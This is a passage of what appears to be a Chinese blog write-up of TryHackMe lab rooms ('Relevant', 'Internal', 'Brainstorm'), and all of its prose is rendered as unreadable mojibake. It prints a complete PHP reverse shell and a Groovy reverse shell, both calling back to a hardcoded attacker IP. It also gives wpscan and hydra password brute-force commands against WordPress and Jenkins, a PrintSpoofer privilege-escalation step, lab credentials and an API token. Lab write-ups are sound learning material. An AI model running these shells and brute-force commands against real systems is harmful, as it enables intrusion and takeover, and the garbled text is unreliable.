c:\\ | find \"user.txt\" #ä½¿ç”¨/bå¸¦æœ‰ DIR å‘½ä»¤çš„å¼€å…³ä¼šå»é™¤æ‰€æœ‰å¤šä½™çš„ä¿¡æ¯ï¼Œä»…æ˜¾ç¤ºå½“å‰ç›®å½•ä¸­çš„æ–‡ä»¶å¤¹å’Œæ–‡ä»¶çš„åç§°ï¼Œè€Œä¸æ˜¾ç¤ºæ–‡ä»¶å¤§å°å’Œæ—¶é—´æˆ³ç­‰å±æ€§ã€‚ #æˆ–è€…ç›´æ¥è¾“å…¥ dir \\user.txt /s Windowsä»¤ç‰Œææƒ æ¥ç€å°±æ˜¯windowsææƒï¼Œè¿˜æ˜¯ä¸ç†Ÿæ‚‰ã€‚ã€‚ã€‚ã€‚ä¸è¿‡è¿™é‡ŒçŸ¥é“æ˜¯åˆ©ç”¨ä»¤ç‰Œçªƒå– ç”±ä¸Šå›¾å¯çŸ¥ å½“å‰ç”¨æˆ·ä¼¼ä¹å¯ç”¨äº† SeImpersonatePrivilege ä»¤ç‰Œæƒé™ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¤ç‰Œæ¨¡æ‹Ÿæ¥æå‡æƒé™ï¼›æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦åœ¨ç›®æ ‡æœºä¸Šæ‰§è¡Œä¸€ä¸ªæ¼æ´åˆ©ç”¨ç¨‹åºâ€“ä¸‹è½½PrintSpoofer.exeï¼Œå¹¶å°†è¯¥exeæ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡æœºï¼ˆå¯ä»¥é€šè¿‡SMBæœåŠ¡ä¸Šä¼ æ–‡ä»¶ï¼‰ã€‚ ä¸Šä¼ ä¹‹å dir /s /b c:\\ | find \"PrintSpoofer64.exe\" æ‰¾åˆ°exeæ‰€åœ¨ä½ç½®ï¼Œè¿è¡Œå³å¯ææƒ PrintSpoofer64.exe -i -c cmd æ€»ç»“ å¸¸è§„æ‰«æä¹‹åï¼Œå‘ç°äº†139ä¸445ç«¯å£ï¼Œå°è¯•æšä¸¾SMBæœåŠ¡ï¼Œå‘ç°å››ä¸ªå…±äº«æ–‡ä»¶ï¼Œå¾ˆå¯ç–‘ï¼Œæ¥ç€æ‰«æwebç«™ç‚¹ç›®å½•ï¼Œä½†æ²¡æœ‰ç»“æœï¼Œå´å‘ç°å››ä¸‡å¤šçš„ç«¯å£ä¹Ÿå¼€å¯äº†IISæœåŠ¡ï¼Œæ¥ç€å°è¯•æ‰«æè¯¥ç«¯å£å¯¹åº”çš„ç›®å½•ï¼Œç»“æœå‘ç°å­˜åœ¨SMBå…±äº«ç›®å½•ã€‚ æ¥ç€å‘ç°SMBçš„å…±äº«ç›®å½•å…è®¸ä¸Šä¼ æ–‡ä»¶ï¼ˆåˆå› ä¸ºèƒ½è®¿é—®å…±äº«ç›®å½•ï¼‰ä¼šæƒ³åˆ°ä¸Šä¼ åå‘shellï¼Œä¹‹åè®¿é—®æ‹¿åˆ°shellï¼Œæ¥ç€å°±æ˜¯Windowsææƒï¼Œwhoami /privå‘ç°æŸäº›ç‰¹æ®Šä»¤ç‰Œå¼€å¯äº†ï¼Œç›´æ¥githubæœç›¸å…³çš„åˆ©ç”¨å·¥å…·ï¼ŒæˆåŠŸsystemæƒé™ã€‚ ç»™æˆ‘çš„æ€è€ƒå°±æ˜¯ï¼Œåœ¨å‰æœŸnmapæ‰«çš„æ—¶å€™ï¼Œå°±å•çº¯çš„æ‰«å…¨ç«¯å£å³å¯ï¼Œæ‰«å‡ºæ¥ï¼Œåœ¨é’ˆå¯¹æ€§çš„å¯ç”¨è„šæœ¬æ‰«æè¿™äº›ç«¯å£ï¼Œå¯èƒ½ä¼šå¾ˆå¿«é€Ÿã€‚ æ¥ç€æ‰«ç›®å½•ä¹Ÿæ²¡å¿…è¦é™·å…¥è¯¯åŒºï¼šéå¾—æ‰«webç«™ç‚¹çš„ç›®å½•ï¼ˆ80ç«¯å£ï¼‰ä¸€å®šè¦éƒ½çœ‹çœ‹ã€‚è¿˜æ˜¯å¾—å­¦ä¼šgoogleï¼Œé‡åˆ°ç›¸å…³å…³é”®é—®é¢˜ï¼Œä¸ä¼šæ‰¾åŠæ³•åˆ©ç”¨ï¼Œåªèƒ½æ— è„‘çœ‹wpï¼Œè¿™å¾ˆå¯ç¬‘ã€‚ å‚è€ƒæ–‡ç«  TryHackMe: Relevant â€” Walkthrough Relevant â€” TryHackMe: Walkthrough Relevant- Try Hack Me 0x12 Internal æ¸—é€æµ‹è¯•ä»»åŠ¡ æ‚¨å·²è¢«åˆ†é…ç»™ä¸€ä½å®¢æˆ·ï¼Œè¯¥å®¢æˆ·å¸Œæœ›å¯¹ä¸‰å‘¨åå‘å¸ƒåˆ°ç”Ÿäº§ç¯å¢ƒçš„ç¯å¢ƒè¿›è¡Œæ¸—é€æµ‹è¯•ã€‚ Scope of Work å·¥ä½œèŒƒå›´ å®¢æˆ·è¯·æ±‚å·¥ç¨‹å¸ˆå¯¹æ‰€æä¾›çš„è™šæ‹Ÿç¯å¢ƒè¿›è¡Œå¤–éƒ¨ã€Web åº”ç”¨ç¨‹åºå’Œå†…éƒ¨è¯„ä¼°ã€‚å®¢æˆ·è¦æ±‚æä¾›æœ‰å…³è¯„ä¼°çš„æœ€å°‘ä¿¡æ¯ï¼Œå¸Œæœ›ä»æ¶æ„è¡Œä¸ºè€…çš„è§’åº¦è¿›è¡Œå‚ä¸ï¼ˆé»‘ç›’æ¸—é€æµ‹è¯•ï¼‰ã€‚å®¢æˆ·è¦æ±‚æ‚¨ç¡®ä¿ä¸¤ä¸ªæ ‡å¿—ï¼ˆæœªæä¾›ä½ç½®ï¼‰ä½œä¸ºåˆ©ç”¨è¯æ®ï¼š User.txt Root.txt æ­¤å¤–ï¼Œå®¢æˆ·è¿˜æä¾›äº†ä»¥ä¸‹èŒƒå›´æ´¥è´´ï¼š ç¡®ä¿ä¿®æ”¹ä¸»æœºæ–‡ä»¶ä»¥åæ˜ internal.thm æœ¬æ¬¡åˆä½œå…è®¸ä½¿ç”¨ä»»ä½•å·¥å…·æˆ–æŠ€æœ¯ æ‰¾åˆ°å¹¶è®°å½•æ‰€æœ‰å‘ç°çš„æ¼æ´ å°†å‘ç°çš„æ ‡å¿—æäº¤åˆ°ä»ªè¡¨æ¿ ä»…åˆ†é…ç»™æ‚¨è®¡ç®—æœºçš„ IP åœ°å€åœ¨èŒƒå›´å†… ï¼ˆè§’è‰²æ‰®æ¼”å…³é—­ï¼‰ æˆ‘é¼“åŠ±æ‚¨å°†è¿™ä¸€æŒ‘æˆ˜è§†ä¸ºå®é™…çš„æ¸—é€æµ‹è¯•ã€‚è€ƒè™‘ç¼–å†™ä¸€ä»½æŠ¥å‘Šï¼Œå…¶ä¸­åŒ…æ‹¬æ‰§è¡Œæ‘˜è¦ã€æ¼æ´å’Œåˆ©ç”¨è¯„ä¼°ä»¥åŠè¡¥æ•‘å»ºè®®ï¼Œå› ä¸ºè¿™å°†æœ‰åˆ©äºæ‚¨ä¸º eLearnsecurity eCPPT æˆ–ä½œä¸ºè¯¥é¢†åŸŸæ¸—é€æµ‹è¯•äººå‘˜çš„èŒä¸šç”Ÿæ¶¯åšå‡†å¤‡ã€‚ æ³¨æ„ - è¿™ä¸ªæˆ¿é—´å¯ä»¥åœ¨æ²¡æœ‰ Metasploit çš„æƒ…å†µä¸‹å®Œæˆ å¸¸è§„æ‰«æ nmap -T5 -p- 10.10.188.153 å‘ç°åªå¼€å¯äº†ä¸¤ä¸ªç«¯å£ï¼Œå…ˆæ‰«ä¸€ä¸‹webç«™ç‚¹ gobuster dir -u \"http://10.10.188.153/\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error -t 50 wordpressæ¸—é€ å‘ç°æ˜¯å­˜åœ¨wordpress CMSï¼Œä¸Šwpscanè¿›è¡Œè¿›ä¸€æ­¥çš„æ‰«æ wpscan --url http://10.10.188.153/wordpress/ é¦–å…ˆæ˜¯ç®€å•æ‰«æï¼Œå‘ç°wpç‰ˆæœ¬ï¼š5.4.2ï¼Œä¸è¿‡googleäº†ä¸€ç•ªæ²¡æ‰¾åˆ°åˆ©ç”¨çš„ï¼Œæƒ³ç€wpscanèƒ½æ‰«å‡ºå•¥ï¼Œå‘ç°è·Ÿworkthroughä¸ä¸€è‡´ï¼ŒåŠ ä¸åŠ tokenéƒ½æ‰«ä¸åˆ°è¿™ä¸ªwpçš„ä¸»é¢˜ï¼Œä½†workthroughå´å¯ä»¥ï¼Œä¸ç†è§£ //æ‰«ææ’ä»¶æ¼æ´ wpscan --api-token WjvZf12T8mMWrRkopYBhoTCQ5tDZfdk0l0vxqNbEpwU --url http://10.10.188.153/wordpress/ -e vp //è·å–wpçš„ç”¨æˆ·å wpscan --api-token WjvZf12T8mMWrRkopYBhoTCQ5tDZfdk0l0vxqNbEpwU --url http://internal.thm/wordpress/ -e u è‡³äºè¿™ä¸ªwpçš„ç”¨æˆ·åï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¿¡æ¯æœé›†ä¸€æ‰‹ï¼Œå¯ä»¥æ‰¾åšå®¢ï¼Œæˆ–è€…ç›´æ¥åœ¨ç™»é™†é¡µé¢ï¼Œè¾“å…¥ä¸€äº›ç”¨æˆ·åï¼Œçœ‹é¡µé¢å›æ˜¾æ˜¯å¦ä¸€è‡´ï¼Œè¿˜æœ‰å°±æ˜¯ä¸Šè¿°wpscançˆ†å‡ºçš„ç”¨æˆ·å ä¹‹åå°è¯•åˆ©ç”¨wpscançˆ†ç ´å¯†ç  wpscan --url http://10.10.188.153/wordpress/ --usernames admin --passwords /usr/share/wordlists/rockyou.txt å¯†ç ï¼šmy2boys å»ºç«‹shell å¦‚ä¸‹å›¾æ‰¾åˆ°ä¸»é¢˜ç¼–è¾‘ï¼Œå¯ä»¥çœ‹åˆ°èƒ½ä¿®æ”¹PHPæ–‡ä»¶ï¼Œä¸Šä¼ ä¸€ä¸ª php_reverse_shell.phpå³å¯ &lt;?php // php-reverse-shell - A Reverse Shell implementation in PHP // Copyright (C) 2007 pentestmonkey@pentestmonkey.net // // This tool may be used for legal purposes only. Users take full responsibility // for any actions performed using this tool. The author accepts no liability // for damage caused by this tool. If these terms are not acceptable to you, then // do not use this tool. // // In all other respects the GPL version 2 applies: // // This program is free software; you can redistribute it and/or modify // it under the terms of the GNU General Public License version 2 as // published by the Free Software Foundation. // // This program is distributed in the hope that it will be useful, // but WITHOUT ANY WARRANTY; without even the implied warranty of // MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the // GNU General Public License for more details. // // You should have received a copy of the GNU General Public License along // with this program; if not, write to the Free Software Foundation, Inc., // 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA. // // This tool may be used for legal purposes only. Users take full responsibility // for any actions performed using this tool. If these terms are not acceptable to // you, then do not use this tool. // // You are encouraged to send comments, improvements or suggestions to // me at pentestmonkey@pentestmonkey.net // // Description // ----------- // This script will make an outbound TCP connection to a hardcoded IP and port. // The recipient will be given a shell running as the current user (apache normally). // // Limitations // ----------- // proc_open and stream_set_blocking require PHP version 4.3+, or 5+ // Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows. // Some compile-time options are needed for daemonisation (like pcntl, posix). These are rarely available. // // Usage // ----- // See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck. set_time_limit (0); $VERSION = \"1.0\"; $ip = '10.14.79.125'; // CHANGE THIS $port = 5555; // CHANGE THIS $chunk_size = 1400; $write_a = null; $error_a = null; $shell = 'uname -a; w; id; /bin/sh -i'; $daemon = 0; $debug = 0; // // Daemonise ourself if possible to avoid zombies later // // pcntl_fork is hardly ever available, but will allow us to daemonise // our php process and avoid zombies. Worth a try... if (function_exists('pcntl_fork')) { // Fork and have the parent process exit $pid = pcntl_fork(); if ($pid == -1) { printit(\"ERROR: Can't fork\"); exit(1); } if ($pid) { exit(0); // Parent exits } // Make the current process a session leader // Will only succeed if we forked if (posix_setsid() == -1) { printit(\"Error: Can't setsid()\"); exit(1); } $daemon = 1; } else { printit(\"WARNING: Failed to daemonise. This is quite common and not fatal.\"); } // Change to a safe directory chdir(\"/\"); // Remove any umask we inherited umask(0); // // Do the reverse shell... // // Open reverse connection $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(\"$errstr ($errno)\"); exit(1); } // Spawn shell process $descriptorspec = array( 0 =&gt; array(\"pipe\", \"r\"), // stdin is a pipe that the child will read from 1 =&gt; array(\"pipe\", \"w\"), // stdout is a pipe that the child will write to 2 =&gt; array(\"pipe\", \"w\") // stderr is a pipe that the child will write to ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(\"ERROR: Can't spawn shell\"); exit(1); } // Set everything to non-blocking // Reason: Occsionally reads will block, even though stream_select tells us they won't stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(\"Successfully opened reverse shell to $ip:$port\"); while (1) { // Check for end of TCP connection if (feof($sock)) { printit(\"ERROR: Shell connection terminated\"); break; } // Check for end of STDOUT if (feof($pipes[1])) { printit(\"ERROR: Shell process terminated\"); break; } // Wait until a command is end down $sock, or some // command output is available on STDOUT or STDERR $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); // If we can read from the TCP socket, send // data to process's STDIN if (in_array($sock, $read_a)) { if ($debug) printit(\"SOCK READ\"); $input = fread($sock, $chunk_size); if ($debug) printit(\"SOCK: $input\"); fwrite($pipes[0], $input); } // If we can read from the process's STDOUT // send data down tcp connection if (in_array($pipes[1], $read_a)) { if ($debug) printit(\"STDOUT READ\"); $input = fread($pipes[1], $chunk_size); if ($debug) printit(\"STDOUT: $input\"); fwrite($sock, $input); } // If we can read from the process's STDERR // send data down tcp connection if (in_array($pipes[2], $read_a)) { if ($debug) printit(\"STDERR READ\"); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\"STDERR: $input\"); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); // Like print, but does nothing if we've daemonised ourself // (I can't figure out how to redirect STDOUT like a proper daemon) function printit ($string) { if (!$daemon) { print \"$string \"; } } ?&gt; ä¹‹åæ‰¾åˆ°404.phpæ–‡ä»¶æ‰€åœ¨è·¯å¾„ï¼Œè®¿é—®å³å¯å¾—åˆ°shell wp-content/themes/twentyseventeen/404.php è¿™é‡Œå°±æœ€å¤´ç–¼äº†ï¼Œæƒ³ç€é è‡ªå·±åŠªåŠ›åŠªåŠ›ï¼Œå½“å‰æ˜¯www-dataæƒé™ï¼Œæ‰€ä»¥éœ€è¦ææƒï¼Œæˆ‘ä¸€ç›´è®¤ä¸ºæœ‰ä»€ä¹ˆæ¼æ´å¯ä»¥ææƒï¼Œä½†æäº†åŠå¤©æ‰¾ä¸åˆ°ï¼Œæˆ‘ä»¥ä¸ºæ˜¯ææƒå§¿åŠ¿å¯èƒ½å¾ˆéªšï¼Œæƒ³ä¸åˆ°è¿˜æ˜¯è¦å›å½’åŸå§‹ï¼šä¿¡æ¯æœé›† å¯†ç æ³„éœ²ææƒuser walkthroughè¿™é‡Œå°±æ˜¯ä¿¡æ¯æœé›†ï¼Œæ‰¾åˆ°äº†optç›®å½•ä¸‹çš„æ•æ„Ÿæ–‡ä»¶ï¼ŒæŸ¥çœ‹å‘ç°ç”¨æˆ·æ³„éœ²çš„å¯†ç ã€‚æ‹¿ç›´æ¥su ç”¨æˆ·ååˆ‡æ¢å³å¯ ï¼ˆä¸ºä½•æ˜¯optå•Šã€‚ã€‚ã€‚ï¼‰ aubreanna:bubb13guM!@#123 åŒæ—¶å‘ç°æœ¬ç›®å½•ä¸‹è¿™ä¸ªæ–‡ä»¶ï¼Œå†™ç€æ­¤æ—¶è¿˜åœ¨å†…ç½‘è¿è¡Œä¸€ä¸ªæœåŠ¡å™¨ sshç«¯å£è½¬å‘æ‹¿ä¸‹å†…ç½‘ä¸»æœº curl -U aubreanna:bubb13guM!@#123 http://172.17.0.2:8080/ ç”±äºæˆ‘ä»¬ä¸èƒ½è®¿é—®å…¶å†…ç½‘ï¼Œå› æ­¤éœ€è¦sshç«¯å£è½¬å‘ä¸€ä¸‹ ssh -f -N -L 4567:172.17.0.2:8080 aubreanna@internal.thm #æ ¹æ®å‰è¿°ç»“æœï¼Œç™»å½•å¯†ç ä¸ºï¼šbubb13guM!@#123 #sshç«¯å£è½¬å‘(æœ¬åœ°ç½‘å¡åœ°å€0.0.0.0å¯çœç•¥)ï¼šHostB$ ssh -L 0.0.0.0:PortB:HostC:PortC user@HostC #å‚æ•°è¯´æ˜ #-Cï¼šå‹ç¼©æ•°æ® #-f ï¼šåå°è®¤è¯ç”¨æˆ·/å¯†ç ï¼Œé€šå¸¸å’Œ-Nè¿ç”¨ï¼Œä¸ç”¨ç™»å½•åˆ°è¿œç¨‹ä¸»æœºã€‚ #-N ï¼šä¸æ‰§è¡Œè„šæœ¬æˆ–å‘½ä»¤ï¼Œé€šå¸¸ä¸-fè¿ç”¨ã€‚ #-g ï¼šåœ¨-L/-R/-Då‚æ•°ä¸­ï¼Œå…è®¸è¿œç¨‹ä¸»æœºè¿æ¥åˆ°å»ºç«‹è½¬å‘çš„ç«¯å£ï¼Œå¦‚æœä¸åŠ è¿™ä¸ªå‚æ•°ï¼Œåªå…è®¸æœ¬åœ°ä¸»æœºå»ºç«‹è¿æ¥ã€‚ #-L : æœ¬åœ°éš§é“ï¼Œæœ¬åœ°ç«¯å£:ç›®æ ‡IP:ç›®æ ‡ç«¯å£ #-D : åŠ¨æ€ç«¯å£è½¬å‘ #-R : è¿œç¨‹éš§é“ #-T ï¼šä¸åˆ†é… TTY åªåšä»£ç†ç”¨ #-q ï¼šå®‰é™æ¨¡å¼ï¼Œä¸è¾“å‡º é”™è¯¯/è­¦å‘Š ä¿¡æ¯ å‘ç°Jenkinsç»„ä»¶ï¼Œå°è¯•çˆ†ç ´è´¦æˆ·å¯†ç ï¼ŒçŒœæµ‹ç”¨æˆ·åå°±æ˜¯admin hydraæš´åŠ›ç ´è§£ hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 4567 127.0.0.1 http-post-form \"/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in:Invalid username or password\" æˆåŠŸå¾—åˆ°å¯†ç ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ‰§è¡Œbashï¼Œä¸è¿‡å°è¯•äº†å¾ˆå¤šï¼Œç»“æœè¿˜æ˜¯walkthroughæœ‰æ•ˆï¼Ÿä¸‹å»çœ‹çœ‹ä¸ºä½• å¥½çš„ï¼Œè¿™æ˜¯å› ä¸ºè¿™ä¸ªè„šæœ¬æ§åˆ¶å°å°±æç¤ºäº†æˆ‘ä»¬åªèƒ½ä½¿ç”¨groovy script å‘ç°googleæœç´¢å³å¯å¾—åˆ° String host=\"10.14.79.125\"; int port=6666; String cmd=\"/bin/bash\"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); æ‰¾åˆ°ä¸‹é¢ä½ç½®ï¼Œæ‰§è¡Œshellå³å¯ å¯†ç æ³„éœ²ææƒroot æ‹¿åˆ°shellï¼Œä¾æ—§ä¿¡æ¯æœé›†ï¼Œå‘ç°rootç”¨æˆ·å¯†ç ï¼Œsuåˆ‡æ¢å³å¯ æ‹¿åˆ°flag æ€»ç»“ åˆç»™æˆ‘æ•´emoäº†ï¼Œä»€ä¹ˆæ—¶å€™æ‰èƒ½å‡­å€Ÿè‡ªå·±åšå‡ºä¸€ä¸ªã€‚ã€‚ã€‚ é¦–å…ˆå¸¸è§„æ‰«æï¼Œåªå‘ç°äº†22ã€80ç«¯å£ï¼Œé‚£æ¯«æ— ç–‘é—®æ‰«webç«™ç‚¹ï¼ŒåŒæ—¶è®¿é—®80çœ‹çœ‹é¡µé¢æ˜¯å¦æœ‰ä»€ä¹ˆä¿¡æ¯æ³„éœ²ï¼Œå‘ç°æ˜¯ä¸€ä¸ªwpç«™ç‚¹ ï¼ŒåŒæ—¶æ³„éœ²äº†ç‰ˆæœ¬ï¼š5.4.2ï¼Œä½†ä¼¼ä¹æ²¡æœ‰ä»€ä¹ˆåˆ©ç”¨æ€è·¯ã€‚æ¥ç€å°±æ˜¯wpscanå·¥å…·çš„åˆ©ç”¨äº†ï¼Œåˆ©ç”¨å®ƒå¯ä»¥æ‰«wpç‰ˆæœ¬ã€å¯èƒ½çš„ç”¨æˆ·åã€çˆ†ç ´å¯†ç ã€æ’ä»¶æ¼æ´ã€ä½¿ç”¨çš„ä¸»é¢˜ç­‰ç­‰ã€‚ è¿™é‡Œæœ¬æ˜¯å¯ä»¥æ‰«å‡ºä¸»é¢˜ä¿¡æ¯çš„ï¼Œä½†æˆ‘ä¸çŸ¥é“ä¸ºä½•æ‰«ä¸å‡ºæ¥ï¼Œéšåå°±æ˜¯æ ¹æ®wpç›®å½•ç»“æ„ï¼Œæ‰¾åˆ°ç™»é™†é¡µé¢ï¼Œåˆ©ç”¨wpscanæš´åŠ›ç ´è§£å¯†ç ï¼Œä¹‹åè¿›å…¥åå°ç¼–è¾‘PHPæ–‡ä»¶ï¼Œæ‹¿åˆ°shellï¼Œå‘ç°è‡ªå·±æ˜¯æœ€æ™®é€šç”¨æˆ·ï¼Œæœ¬ä»¥ä¸ºæ˜¯åˆ©ç”¨é…ç½®æ¼æ´æ¥ææƒå•¥çš„ï¼Œä½†è¿˜æ˜¯éœ€è¦å›å½’æœ¬è´¨ï¼Œåšä¸€æ‰‹ä¿¡æ¯æœé›†ï¼Œè¿™é‡Œwalkthroughæ˜¯æœé›†åˆ°äº†optç›®å½•ä¸‹å­˜åœ¨ç”¨æˆ·å¯†ç æ³„éœ²ï¼Œæ¥ç€suå°±å¯ä»¥åˆ‡æ¢ç”¨æˆ·ï¼Œä½†è¿˜ä¸æ˜¯ rootï¼Œä¹‹åå‘ç°å…¶å†…ç½‘ç½‘æ®µè¿˜å­˜åœ¨ä¸€ä¸ªwebæœåŠ¡ï¼Œä½†æˆ‘ä»¬åœ¨å¤–ç½‘ï¼Œéœ€è¦ç«¯å£è½¬å‘ï¼ˆåœ¨å›é¡¾ä¸€æ‰‹sshç«¯å£è½¬å‘ï¼‰ï¼Œæ¥ç€æœ¬åœ°å¯ä»¥è®¿é—®å…¶å†…ç½‘äº†ï¼Œç„¶åå‘ç°æ˜¯jenkinsç»„ä»¶ï¼Œhydraæš´åŠ›ç ´è§£è¿›å…¥åå°ï¼Œæ‰§è¡Œshellï¼Œç›‘å¬æ‹¿åˆ°shellï¼Œå‘ç°è¯¥ä¸»æœºä¸‹ä¹Ÿæœ‰å¯†ç æ³„éœ²ï¼Œå¾—åˆ°rootå¯†ç ã€‚æˆåŠŸææƒ æ€»çš„æ¥è¯´ï¼Œè¿˜æ˜¯éœ€è¦æœ‰æ€è·¯å’ŒæŠ€æœ¯çš„ç»éªŒç§¯ç´¯ï¼Œè™½ç„¶æˆ‘æ‰«å‡ºäº†ç›¸å…³ä¿¡æ¯ï¼Œä½†è¿˜æ˜¯æ— ä»ä¸‹æ‰‹ï¼Œä¹‹ååœ¨å›é¡¾ä¸€ä¸‹ä¹‹å‰çš„æ—…ç¨‹ï¼Œçœ‹æ¥ä¸‹æ¥çš„é¶æœºæ˜¯å¦ä¼šæ›´è¿›ä¸€æ­¥å§ã€‚ é¡ºä¾¿è¯´ä¸€ä¸‹åˆšå¼€å§‹ä¸ºä½•IPè®¿é—®ä¼šå‡ºç°é¡µé¢æ¸²æŸ“ä¸å…¨çš„é—®é¢˜ï¼Œä½†ç”¨åŸŸåè®¿é—®å°±ä¼šæ­£å¸¸ï¼š å½“åªä½¿ç”¨IPåœ°å€è®¿é—®ç½‘ç«™è€Œæ— æ³•æ­£å¸¸æ¸²æŸ“çš„åŸå› å¯èƒ½æœ‰ä»¥ä¸‹å‡ ç‚¹ï¼š 1. è™šæ‹Ÿä¸»æœºé…ç½®ï¼šè®¸å¤šç½‘ç«™ä½¿ç”¨è™šæ‹Ÿä¸»æœºæŠ€æœ¯ï¼Œåœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Šæ‰˜ç®¡å¤šä¸ªç½‘ç«™ã€‚å½“é€šè¿‡åŸŸåè®¿é—®ç½‘ç«™æ—¶ï¼ŒWebæœåŠ¡å™¨å¯ä»¥æ ¹æ®è¯·æ±‚çš„åŸŸåå°†è¯·æ±‚è·¯ç”±åˆ°æ­£ç¡®çš„è™šæ‹Ÿä¸»æœºï¼Œä»è€Œæä¾›æ­£ç¡®çš„ç½‘ç«™å†…å®¹ã€‚ä½†æ˜¯ï¼Œå½“æ‚¨åªä½¿ç”¨IPåœ°å€è®¿é—®ç½‘ç«™æ—¶ï¼ŒæœåŠ¡å™¨æ— æ³•ç¡®å®šæ‚¨è¦è®¿é—®å“ªä¸ªè™šæ‹Ÿä¸»æœºï¼Œå¯èƒ½ä¼šè¿”å›é»˜è®¤çš„æˆ–é”™è¯¯çš„å†…å®¹ã€‚ 2. åŸŸåç»‘å®šå’Œé‡å®šå‘ï¼šæœ‰äº›ç½‘ç«™å¯èƒ½ä½¿ç”¨åŸŸåç»‘å®šæˆ–é‡å®šå‘æ¥å°†ç‰¹å®šçš„åŸŸåæ˜ å°„åˆ°å¯¹åº”çš„ç½‘ç«™ç›®å½•æˆ–URLã€‚å½“æ‚¨åªä½¿ç”¨IPåœ°å€è®¿é—®ç½‘ç«™æ—¶ï¼Œç¼ºå°‘äº†åŸŸåä¿¡æ¯ï¼Œå¯èƒ½æ— æ³•è§¦å‘æ­£ç¡®çš„åŸŸåç»‘å®šæˆ–é‡å®šå‘æ“ä½œï¼Œå¯¼è‡´æ¸²æŸ“ä¸å…¨æˆ–æ˜¾ç¤ºé”™è¯¯çš„å†…å®¹ã€‚ 3. åŸºäºåŸŸåçš„èµ„æºåŠ è½½ï¼šç½‘ç«™ä¸­çš„ä¸€äº›èµ„æºï¼ˆä¾‹å¦‚æ ·å¼è¡¨ã€JavaScriptæ–‡ä»¶ã€å›¾åƒç­‰ï¼‰å¯èƒ½ä½¿ç”¨ç›¸å¯¹è·¯å¾„æˆ–åŸºäºåŸŸåçš„ç»å¯¹è·¯å¾„è¿›è¡Œå¼•ç”¨ã€‚å½“åªä½¿ç”¨IPåœ°å€è®¿é—®ç½‘ç«™æ—¶ï¼Œæµè§ˆå™¨æ— æ³•ç¡®å®šæ­£ç¡®çš„åŸŸåï¼Œå› æ­¤æ— æ³•åŠ è½½è¿™äº›èµ„æºï¼Œå¯¼è‡´ç½‘ç«™æ¸²æŸ“ä¸å…¨æˆ–ç¼ºå°‘æ ·å¼å’Œå›¾åƒç­‰å…ƒç´ ã€‚ ä½¿ç”¨åŸŸåè®¿é—®ç½‘ç«™å¯ä»¥è§£å†³ä¸Šè¿°é—®é¢˜ï¼Œå› ä¸ºåŸŸåæä¾›äº†æ›´å¤šçš„ä¿¡æ¯å’Œä¸Šä¸‹æ–‡ï¼Œä½¿å¾—æœåŠ¡å™¨èƒ½å¤Ÿæ­£ç¡®åœ°å¤„ç†è¯·æ±‚å¹¶æä¾›æ­£ç¡®çš„å†…å®¹ã€‚å¦‚æœåªèƒ½ä½¿ç”¨IPåœ°å€è®¿é—®ç½‘ç«™ï¼Œå¹¶ä¸”é‡åˆ°äº†æ¸²æŸ“ä¸å…¨çš„é—®é¢˜ï¼Œå»ºè®®ä½¿ç”¨åŸŸåè®¿é—®ï¼Œæˆ–è€…è”ç³»ç½‘ç«™ç®¡ç†å‘˜ä»¥è·å–æ›´å¤šæ”¯æŒå’Œè§£å†³æ–¹æ¡ˆã€‚ å‚è€ƒæ–‡ç«  ã€THMã€‘Internal-ç»ƒä¹  wpscanä½¿ç”¨æ•™ç¨‹ 0x13 Brainstorm å¸¸è§„æšä¸¾ å¿«é€Ÿæ‰«æå‘ç°å¼€æ”¾äº†ä¸‰ä¸ªç«¯å£ æ¥ç€å°è¯•ç»§ç»­æšä¸¾ftpæœåŠ¡ï¼Œftp ipç™»å½•ï¼Œå‘ç°å¯ä»¥åŒ¿åç™»å½• ä½†æ˜¯å½“æˆ‘ä»¬æ‰§è¡Œlsçš„æ—¶å€™ï¼Œå‘ç°å…¶è¿›å…¥äº†è¢«åŠ¨æ¨¡å¼ï¼Œä¹Ÿæ²¡æœ‰ä»»ä½•æ•°æ®çš„æ˜¾ç¤ºï¼ŒæŸ¥èµ„æ–™å‘ç°ï¼Œpassiveå³å¯é€€å‡ºã€‚ ä¹‹åç»§ç»­å°è¯•lså‘½ä»¤ï¼Œå‘ç°æ— æ³•è¯†åˆ«ï¼Œåˆ‡æ¢dirï¼Œå‘ç°charserverç›®å½•ï¼Œè¿›å…¥ä¹‹åçœ‹åˆ°exeäºŒè¿›åˆ¶æ–‡ä»¶ å½“æˆ‘å°è¯•æƒ³ä¸‹è½½è¿™ä¸¤ä¸ªæ–‡ä»¶çš„æ—¶å€™ï¼Œçˆ†å‡ºå¦‚ä¸‹é”™è¯¯ ä¸Šè¿°å›¾ç‰‡è¯´æ˜ï¼Œæ–‡ä»¶ä¸èƒ½æ­£ç¡®çš„ä¼ 